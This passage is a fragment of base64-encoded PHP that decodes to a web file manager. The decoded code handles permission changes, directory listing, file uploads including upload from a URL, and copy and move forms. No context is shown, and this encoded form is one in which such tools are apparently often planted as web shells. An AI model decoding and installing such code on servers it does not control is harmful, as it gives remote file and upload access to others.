7DQogICAgICAgICRtb2RlIHw9IDAyMDA7DQogICAgfQ0KICAgIGlmICghZW1wdHkoJF9QT1NUWyd1eCddKSkgew0KICAgICAgICAkbW9kZSB8PSAwMTAwOw0KICAgIH0NCiAgICBpZiAoIWVtcHR5KCRfUE9TVFsnZ3InXSkpIHsNCiAgICAgICAgJG1vZGUgfD0gMDA0MDsNCiAgICB9DQogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ2d3J10pKSB7DQogICAgICAgICRtb2RlIHw9IDAwMjA7DQogICAgfQ0KICAgIGlmICghZW1wdHkoJF9QT1NUWydneCddKSkgew0KICAgICAgICAkbW9kZSB8PSAwMDEwOw0KICAgIH0NCiAgICBpZiAoIWVtcHR5KCRfUE9TVFsnb3InXSkpIHsNCiAgICAgICAgJG1vZGUgfD0gMDAwNDsNCiAgICB9DQogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ293J10pKSB7DQogICAgICAgICRtb2RlIHw9IDAwMDI7DQogICAgfQ0KICAgIGlmICghZW1wdHkoJF9QT1NUWydveCddKSkgew0KICAgICAgICAkbW9kZSB8PSAwMDAxOw0KICAgIH0NCg0KICAgIGlmIChAY2htb2QoJHBhdGggLiAnLycgLiAkZmlsZSwgJG1vZGUpKSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdQZXJtaXNzaW9ucyBjaGFuZ2VkJykpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdQZXJtaXNzaW9ucyBub3QgY2hhbmdlZCcpLCAnZXJyb3InKTsNCiAgICB9DQoNCiAgICAkRk1fUEFUSD1GTV9QQVRIOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQp9DQoNCi8qKioqKioqKioqKioqKioqKioqKioqKioqKiogQUNUSU9OUyAqKioqKioqKioqKioqKioqKioqKioqKioqKiovDQoNCi8vIGdldCBjdXJyZW50IHBhdGgNCiRwYXRoID0gRk1fUk9PVF9QQVRIOw0KaWYgKEZNX1BBVEggIT0gJycpIHsNCiAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOw0KfQ0KDQovLyBjaGVjayBwYXRoDQppZiAoIWlzX2RpcigkcGF0aCkpIHsNCiAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nKTsNCn0NCg0KLy8gZ2V0IHBhcmVudCBmb2xkZXINCiRwYXJlbnQgPSBmbV9nZXRfcGFyZW50X3BhdGgoRk1fUEFUSCk7DQoNCiRvYmplY3RzID0gaXNfcmVhZGFibGUoJHBhdGgpID8gc2NhbmRpcigkcGF0aCkgOiBhcnJheSgpOw0KJGZvbGRlcnMgPSBhcnJheSgpOw0KJGZpbGVzID0gYXJyYXkoKTsNCiRjdXJyZW50X3BhdGggPSBhcnJheV9zbGljZShleHBsb2RlKCIvIiwkcGF0aCksIC0xKVswXTsNCmlmIChpc19hcnJheSgkb2JqZWN0cykgJiYgZm1faXNfZXhjbHVkZV9pdGVtcygkY3VycmVudF9wYXRoKSkgew0KICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7DQogICAgICAgIGlmICgkZmlsZSA9PSAnLicgfHwgJGZpbGUgPT0gJy4uJykgew0KICAgICAgICAgICAgY29udGludWU7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFGTV9TSE9XX0hJRERFTiAmJiBzdWJzdHIoJGZpbGUsIDAsIDEpID09PSAnLicpIHsNCiAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICB9DQogICAgICAgICRuZXdfcGF0aCA9ICRwYXRoIC4gJy8nIC4gJGZpbGU7DQogICAgICAgIGlmIChAaXNfZmlsZSgkbmV3X3BhdGgpICYmIGZtX2lzX2V4Y2x1ZGVfaXRlbXMoJGZpbGUpKSB7DQogICAgICAgICAgICAkZmlsZXNbXSA9ICRmaWxlOw0KICAgICAgICB9IGVsc2VpZiAoQGlzX2RpcigkbmV3X3BhdGgpICYmICRmaWxlICE9ICcuJyAmJiAkZmlsZSAhPSAnLi4nICYmIGZtX2lzX2V4Y2x1ZGVfaXRlbXMoJGZpbGUpKSB7DQogICAgICAgICAgICAkZm9sZGVyc1tdID0gJGZpbGU7DQogICAgICAgIH0NCiAgICB9DQp9DQoNCmlmICghZW1wdHkoJGZpbGVzKSkgew0KICAgIG5hdGNhc2Vzb3J0KCRmaWxlcyk7DQp9DQppZiAoIWVtcHR5KCRmb2xkZXJzKSkgew0KICAgIG5hdGNhc2Vzb3J0KCRmb2xkZXJzKTsNCn0NCg0KLy8gdXBsb2FkIGZvcm0NCmlmIChpc3NldCgkX0dFVFsndXBsb2FkJ10pICYmICFGTV9SRUFET05MWSkgew0KICAgIGZtX3Nob3dfaGVhZGVyKCk7IC8vIEhFQURFUg0KICAgIGZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IC8vIGN1cnJlbnQgcGF0aA0KICAgIC8vZ2V0IHRoZSBhbGxvd2VkIGZpbGUgZXh0ZW5zaW9ucw0KICAgIGZ1bmN0aW9uIGdldFVwbG9hZEV4dCgpIHsNCiAgICAgICAgJGV4dEFyciA9IGV4cGxvZGUoJywnLCBGTV9VUExPQURfRVhURU5TSU9OKTsNCiAgICAgICAgaWYoRk1fVVBMT0FEX0VYVEVOU0lPTiAmJiAkZXh0QXJyKSB7DQogICAgICAgICAgICBhcnJheV93YWxrKCRleHRBcnIsIGZ1bmN0aW9uKCYkeCkgeyR4ID0gIi4keCI7fSk7DQogICAgICAgICAgICByZXR1cm4gaW1wbG9kZSgnLCcsICRleHRBcnIpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAnJzsNCiAgICB9DQogICAgPz4NCiAgICA8P3BocCBwcmludF9leHRlcm5hbCgnY3NzLWRyb3B6b25lJyk7ID8+DQogICAgPGRpdiBjbGFzcz0icGF0aCI+DQoNCiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBtYi0yIGZtLXVwbG9hZC13cmFwcGVyIDw/cGhwIGVjaG8gZm1fZ2V0X3RoZW1lKCk7ID8+Ij4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj4NCiAgICAgICAgICAgICAgICA8dWwgY2xhc3M9Im5hdiBuYXYtdGFicyBjYXJkLWhlYWRlci10YWJzIj4NCiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+DQogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsgYWN0aXZlIiBocmVmPSIjZmlsZVVwbG9hZGVyIiBkYXRhLXRhcmdldD0iI2ZpbGVVcGxvYWRlciI+PGkgY2xhc3M9ImZhIGZhLWFycm93LWNpcmNsZS1vLXVwIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdVcGxvYWRpbmdGaWxlcycpID8+PC9hPg0KICAgICAgICAgICAgICAgICAgICA8L2xpPg0KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iI3VybFVwbG9hZGVyIiBjbGFzcz0ianMtdXJsLXVwbG9hZCIgZGF0YS10YXJnZXQ9IiN1cmxVcGxvYWRlciI+PGkgY2xhc3M9ImZhIGZhLWxpbmsiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1VwbG9hZCBmcm9tIFVSTCcpID8+PC9hPg0KICAgICAgICAgICAgICAgICAgICA8L2xpPg0KICAgICAgICAgICAgICAgIDwvdWw+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+DQogICAgICAgICAgICAgICAgPHAgY2xhc3M9ImNhcmQtdGV4dCI+DQogICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ij9wPTw/cGhwIGVjaG8gRk1fUEFUSCA/PiIgY2xhc3M9ImZsb2F0LXJpZ2h0Ij48aSBjbGFzcz0iZmEgZmEtY2hldnJvbi1jaXJjbGUtbGVmdCBnby1iYWNrIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdCYWNrJyk/PjwvYT4NCiAgICAgICAgICAgICAgICAgICAgPHN0cm9uZz48P3BocCBlY2hvIGxuZygnRGVzdGluYXRpb25Gb2xkZXInKSA/Pjwvc3Ryb25nPjogPD9waHAgZWNobyBmbV9lbmMoZm1fY29udmVydF93aW4oRk1fUEFUSCkpID8+DQogICAgICAgICAgICAgICAgPC9wPg0KDQogICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoRk1fU0VMRl9VUkwpIC4gJz9wPScgLiBmbV9lbmMoRk1fUEFUSCkgPz4iIGNsYXNzPSJkcm9wem9uZSBjYXJkLXRhYnMtY29udGFpbmVyIiBpZD0iZmlsZVVwbG9hZGVyIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icCIgdmFsdWU9Ijw/cGhwIGVjaG8gZm1fZW5jKEZNX1BBVEgpID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZnVsbHBhdGgiIGlkPSJmdWxscGF0aCIgdmFsdWU9Ijw/cGhwIGVjaG8gZm1fZW5jKEZNX1BBVEgpID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSI8P3BocCBlY2hvICRfU0VTU0lPTlsndG9rZW4nXTsgPz4iPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmYWxsYmFjayI+DQogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgbmFtZT0iZmlsZSIgdHlwZT0iZmlsZSIgbXVsdGlwbGUvPg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Zvcm0+DQoNCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ1cGxvYWQtdXJsLXdyYXBwZXIgY2FyZC10YWJzLWNvbnRhaW5lciBoaWRkZW4iIGlkPSJ1cmxVcGxvYWRlciI+DQogICAgICAgICAgICAgICAgICAgIDxmb3JtIGlkPSJqcy1mb3JtLXVybC11cGxvYWQiIGNsYXNzPSJyb3cgcm93LWNvbHMtbGctYXV0byBnLTMgYWxpZ24taXRlbXMtY2VudGVyIiBvbnN1Ym1pdD0icmV0dXJuIHVwbG9hZF9mcm9tX3VybCh0aGlzKTsiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idHlwZSIgdmFsdWU9InVwbG9hZCIgYXJpYS1sYWJlbD0iaGlkZGVuIiBhcmlhLWhpZGRlbj0idHJ1ZSI+DQogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idXJsIiBwbGFjZWhvbGRlcj0iVVJMIiBuYW1lPSJ1cGxvYWR1cmwiIHJlcXVpcmVkIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJ3aWR0aDogODAlIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iPD9waHAgZWNobyAkX1NFU1NJT05bJ3Rva2VuJ107ID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IG1zLTMiPjw/cGhwIGVjaG8gbG5nKCdVcGxvYWQnKSA/PjwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibGRzLWZhY2Vib29rIj48ZGl2PjwvZGl2PjxkaXY+PC9kaXY+PGRpdj48L2Rpdj48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGlkPSJqcy11cmwtdXBsb2FkX19saXN0IiBjbGFzcz0iY29sLTkgbXQtMyI+PC9kaXY+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ2pzLWRyb3B6b25lJyk7ID8+DQogICAgPHNjcmlwdD4NCiAgICAgICAgRHJvcHpvbmUub3B0aW9ucy5maWxlVXBsb2FkZXIgPSB7DQogICAgICAgICAgICBjaHVua2luZzogdHJ1ZSwNCiAgICAgICAgICAgIGNodW5rU2l6ZTogPD9waHAgZWNobyBVUExPQURfQ0hVTktfU0laRTsgPz4sDQogICAgICAgICAgICBmb3JjZUNodW5raW5nOiB0cnVlLA0KICAgICAgICAgICAgcmV0cnlDaHVua3M6IHRydWUsDQogICAgICAgICAgICByZXRyeUNodW5rc0xpbWl0OiAzLA0KICAgICAgICAgICAgcGFyYWxsZWxVcGxvYWRzOiAxLA0KICAgICAgICAgICAgcGFyYWxsZWxDaHVua1VwbG9hZHM6IGZhbHNlLA0KICAgICAgICAgICAgdGltZW91dDogMTIwMDAwLA0KICAgICAgICAgICAgbWF4RmlsZXNpemU6ICI8P3BocCBlY2hvIE1BWF9VUExPQURfU0laRTsgPz4iLA0KICAgICAgICAgICAgYWNjZXB0ZWRGaWxlcyA6ICI8P3BocCBlY2hvIGdldFVwbG9hZEV4dCgpID8+IiwNCiAgICAgICAgICAgIGluaXQ6IGZ1bmN0aW9uICgpIHsNCiAgICAgICAgICAgICAgICB0aGlzLm9uKCJzZW5kaW5nIiwgZnVuY3Rpb24gKGZpbGUsIHhociwgZm9ybURhdGEpIHsNCiAgICAgICAgICAgICAgICAgICAgbGV0IF9wYXRoID0gKGZpbGUuZnVsbFBhdGgpID8gZmlsZS5mdWxsUGF0aCA6IGZpbGUubmFtZTsNCiAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZ1bGxwYXRoIikudmFsdWUgPSBfcGF0aDsNCiAgICAgICAgICAgICAgICAgICAgeGhyLm9udGltZW91dCA9IChmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRvYXN0KCdFcnJvcjogU2VydmVyIFRpbWVvdXQnKTsNCiAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgfSkub24oInN1Y2Nlc3MiLCBmdW5jdGlvbiAocmVzKSB7DQogICAgICAgICAgICAgICAgICAgIGxldCBfcmVzcG9uc2UgPSBKU09OLnBhcnNlKHJlcy54aHIucmVzcG9uc2UpOw0KDQogICAgICAgICAgICAgICAgICAgIGlmKF9yZXNwb25zZS5zdGF0dXMgPT0gImVycm9yIikgew0KICAgICAgICAgICAgICAgICAgICAgICAgdG9hc3QoX3Jlc3BvbnNlLmluZm8pOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSkub24oImVycm9yIiwgZnVuY3Rpb24oZmlsZSwgcmVzcG9uc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgdG9hc3QocmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgPC9zY3JpcHQ+DQogICAgPD9waHANCiAgICBmbV9zaG93X2Zvb3RlcigpOw0KICAgIGV4aXQ7DQp9DQoNCi8vIGNvcHkgZm9ybSBQT1NUDQppZiAoaXNzZXQoJF9QT1NUWydjb3B5J10pICYmICFGTV9SRUFET05MWSkgew0KICAgICRjb3B5X2ZpbGVzID0gaXNzZXQoJF9QT1NUWydmaWxlJ10pID8gJF9QT1NUWydmaWxlJ10gOiBudWxsOw0KICAgIGlmICghaXNfYXJyYXkoJGNvcHlfZmlsZXMpIHx8IGVtcHR5KCRjb3B5X2ZpbGVzKSkgew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnTm90aGluZyBzZWxlY3RlZCcpLCAnYWxlcnQnKTsNCiAgICAgICAgJEZNX1BBVEg9Rk1fUEFUSDsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KICAgIH0NCg0KICAgIGZtX3Nob3dfaGVhZGVyKCk7IC8vIEhFQURFUg0KICAgIGZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IC8vIGN1cnJlbnQgcGF0aA0KICAgID8+DQogICAgPGRpdiBjbGFzcz0icGF0aCI+DQogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgPD9waHAgZWNobyBmbV9nZXRfdGhlbWUoKTsgPz4iPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPg0KICAgICAgICAgICAgICAgIDxoNj48P3BocCBlY2hvIGxuZygnQ29weWluZycpID8+PC9oNj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgICAgICAgICAgICAgICA8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icCIgdmFsdWU9Ijw/cGhwIGVjaG8gZm1fZW5jKEZNX1BBVEgpID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZmluaXNoIiB2YWx1ZT0iMSI+DQogICAgICAgICAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRjb3B5X2ZpbGVzIGFzICRjZikgew0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAnPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZmlsZVtdIiB2YWx1ZT0iJyAuIGZtX2VuYygkY2YpIC4gJyI+JyAuIFBIUF9FT0w7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9ImJyZWFrLXdvcmQiPjxzdHJvbmc+PD9waHAgZWNobyBsbmcoJ0ZpbGVzJykgPz48L3N0cm9uZz46IDxiPjw/cGhwIGVjaG8gaW1wbG9kZSgnPC9iPiwgPGI+JywgJGNvcHlfZmlsZXMpID8+PC9iPjwvcD4NCiAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9ImJyZWFrLXdvcmQiPjxzdHJvbmc+PD9waHAgZWNobyBsbmcoJ1NvdXJjZUZvbGRlcicpID8+PC9zdHJvbmc+OiA8P3BocCBlY2hvIGZtX2VuYyhmbV9jb252ZXJ0X3dpbihGTV9ST09UX1BBVEggLiAnLycgLiBGTV9QQVRIKSkgPz48YnI+DQogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJpbnBfY29weV90byI+PHN0cm9uZz48P3BocCBlY2hvIGxuZygnRGVzdGluYXRpb25Gb2xkZXInKSA/Pjwvc3Ryb25nPjo8L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyBGTV9ST09UX1BBVEggPz4vPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNvcHlfdG8iIGlkPSJpbnBfY29weV90byIgdmFsdWU9Ijw/cGhwIGVjaG8gZm1fZW5jKEZNX1BBVEgpID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgPC9wPg0KICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0iY3VzdG9tLWNoZWNrYm94IGN1c3RvbS1jb250cm9sIj48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im1vdmUiIHZhbHVlPSIxIiBpZD0ianMtbW92ZS1maWxlcyIgY2xhc3M9ImN1c3RvbS1jb250cm9sLWlucHV0Ij48bGFiZWwgZm9yPSJqcy1tb3ZlLWZpbGVzIiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtbGFiZWwgbXMtMiI+IDw/cGhwIGVjaG8gbG5nKCdNb3ZlJykgPz48L2xhYmVsPjwvcD4NCiAgICAgICAgICAgICAgICAgICAgPHA+DQogICAgICAgICAgICAgICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiIgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1kYW5nZXIiPjxpIGNsYXNzPSJmYSBmYS10aW1lcy1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0NhbmNlbCcpID8+PC9hPjwvYj4mbmJzcDsNCiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iPD9waHAgZWNobyAkX1NFU1NJT05bJ3Rva2VuJ107ID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIj48aSBjbGFzcz0iZmEgZmEtY2hlY2stY2lyY2xlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdDb3B5JykgPz48L2J1dHRvbj4gDQogICAgICAgICAgICAgICAgICAgIDwvcD4NCiAgICAgICAgICAgICAgICA8L2Zvcm0+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgPD9waHANCiAgICBmbV9zaG93X2Zvb3RlcigpOw0KICAgIGV4aXQ7DQp9DQoNCi8vIGNvcHkgZm9ybQ0KaWYgKGlzc2V0KCRfR0VUWydjb3B5J10pICYmICFpc3NldCgkX0dFVFsnZmluaXNoJ10pICYmICFGTV9SRUFET05MWSkgew0KICAgICRjb3B5ID0gJF9HRVRbJ2NvcHknXTsNCiAgICAkY29weSA9IGZtX2NsZWFuX3BhdGgoJGNvcHkpOw0KICAgIGlmICgkY29weSA9PSAnJyB8fCAhZmlsZV9leGlzdHMoRk1fUk9PVF9QQVRIIC4gJy8nIC4gJGNvcHkpKSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdGaWxlIG5vdCBmb3VuZCcpLCAnZXJyb3InKTsNCiAgICAgICAgJEZNX1BBVEg9Rk1fUEFUSDsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KICAgIH0NCg0KICAgIGZtX3Nob3dfaGVhZGVyKCk7IC8vIEhFQURFUg0KICAgIGZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IC8vIGN1cnJlbnQgcGF0aA0KICAgID8+DQogICAgPGRpdiBjbGFzcz0icGF0aCI+DQogICAgICAgIDxwPjxiPkNvcHlpbmc8L2I+PC9wPg0KICAgICAgICA8cCBjbGFzcz0iYnJlYWstd29yZCI+DQogICAgICAgICAgICA8c3Ryb25nPlNvdXJjZSBwYXRoOjwvc3Ryb25nPiA8P3BocCBlY2hvIGZtX2VuYyhmbV9jb252ZXJ0X3dpbihGTV9ST09UX1BBVEggLiAnLycgLiAkY29weSkpID8+PGJyPg0KICAgICAgICAgICAgPHN0cm9uZz5EZXN0aW5hdGlvbiBmb2xkZXI6PC9zdHJvbmc+IDw/cGhwIGVjaG8gZm1fZW5jKGZtX2NvbnZlcnRfd2luKEZNX1JPT1RfUEFUSCAuICcvJyAuIEZNX1BBVEgpKSA/Pg0KICAgICAgICA8L3A+DQogICAgICAgIDxwPg0KICAgICAgICAgICAgPGI+PGEgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2NvcHk9PD9waHAgZWNobyB1cmxlbmNvZGUoJGNvcHkpID8+JmFtcDtmaW5pc2g9MSI+PGkgY2xhc3M9ImZhIGZhLWNoZWNrLWNpcmNsZSI+PC9pPiBDb3B5PC9hPjwvYj4gJm5ic3A7DQogICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7Y29weT08P3BocCBlY2hvIHVybGVuY29kZSgkY29weSkgPz4mYW1wO2ZpbmlzaD0xJmFtcDttb3ZlPTEiPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gTW92ZTwvYT48L2I+ICZuYnNwOw0KICAgICAgICAgICAgPGI+PGEgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4iIGNsYXNzPSJ0ZXh0LWRhbmdlciI+PGkgY2xhc3M9ImZhIGZhLXRpbWVzLWNpcmNsZSI+PC9pPiBDYW5jZWw8L2E+PC9iPg0KICAgICAgICA8L3A+DQogICAgICAgIDxwPjxpPjw/cGhwIGVjaG8gbG5nKCdTZWxlY3QgZm9sZGVyJykgPz48L2k+PC9wPg0KICAgICAgICA8dWwgY2xhc3M9ImZvbGRlcnMgYnJlYWstd29yZCI+DQogICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgaWYgKCRwYXJlbnQgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICA8bGk+PGEgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoJHBhcmVudCkgPz4mYW1wO2NvcHk9PD9waHAgZWNobyB1cmxlbmNvZGUoJGNvcHkpID8+Ij48aSBjbGFzcz0iZmEgZmEtY2hldnJvbi1jaXJjbGUtbGVmdCI+PC9pPiAuLjwvYT48L2xpPg0KICAgICAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICB9DQogICAgICAgICAgICBmb3JlYWNoICgkZm9sZGVycyBhcyAkZikgew0KICAgICAgICAgICAgICAgID8+DQogICAgICAgICAgICAgICAgPGxpPg0KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEggLiAnLycgLiAkZiwgJy8nKSkgPz4mYW1wO2NvcHk9PD9waHAgZWNobyB1cmxlbmNvZGUoJGNvcHkpID8+Ij48aSBjbGFzcz0iZmEgZmEtZm9sZGVyLW8iPjwvaT4gPD9waHAgZWNobyBmbV9jb252ZXJ0X3dpbigkZikgPz48L2E+PC9saT4NCiAgICAgICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgPz4NCiAgICAgICAgPC91bD4NCiAgICA8L2Rpdj4NCiAgICA8P3BocA0KICAgIGZtX3Nob3dfZm9vdGVyKCk7DQogICAgZXhpdDsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydzZXR0aW5ncyddKSAmJiAhRk1fUkVBRE9OTFkpIHsNCiAgICBmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVINCiAgICBmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyAvLyBjdXJyZW50IHBhdGgNCiAgICBnbG9iYWwgJGNmZywgJGxhbmcsICRsYW5nX2xpc3Q7DQogICAgPz4NCg0KICAgIDxkaXYgY2xhc3M9ImNvbC1tZC04IG9mZnNldC1tZC0yIHB0LTMiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIG1iLTIgPD9waHAgZWNobyBmbV9nZXRfdGhlbWUoKTsgPz4iPg0KICAgICAgICAgICAgPGg2IGNsYXNzPSJjYXJkLWhlYWRlciBkLWZsZXgganVzdGlmeS1jb250ZW50LWJldHdlZW4iPg0KICAgICAgICAgICAgICAgIDxzcGFuPjxpIGNsYXNzPSJmYSBmYS1jb2ciPjwvaT4gIDw/cGhwIGVjaG8gbG5nKCdTZXR0aW5ncycpID8+PC9zcGFuPg0KICAgICAgICAgICAgICAgIDxhIGhyZWY9Ij9wPTw/cGhwIGVjaG8gRk1fUEFUSCA/PiIgY2xhc3M9InRleHQtZGFuZ2VyIj48aSBjbGFzcz0iZmEgZmEtdGltZXMtY2lyY2xlLW8iPjwvaT4gPD9waHAgZWNobyBsbmcoJ0NhbmNlbCcpPz48L2E+DQogICAgICAgICAgICA8L2g2Pg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgICAgICAgICAgICAgICA8Zm9ybSBpZD0ianMtc2V0dGluZ3MtZm9ybSIgYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZGF0YS10eXBlPSJhamF4IiBvbnN1Ym1pdD0icmV0dXJuIHNhdmVfc2V0dGluZ3ModGhpcykiPg0KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0eXBlIiB2YWx1ZT0ic2V0dGluZ3MiIGFyaWEtbGFiZWw9ImhpZGRlbiIgYXJpYS1oaWRkZW49InRydWUiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHJvdyI+DQogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJqcy1sYW5ndWFnZSIgY2xhc3M9ImNvbC1zbS0zIGNvbC1mb3JtLWxhYmVsIj48P3BocCBlY2hvIGxuZygnTGFuZ3VhZ2UnKSA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtc20tNSI+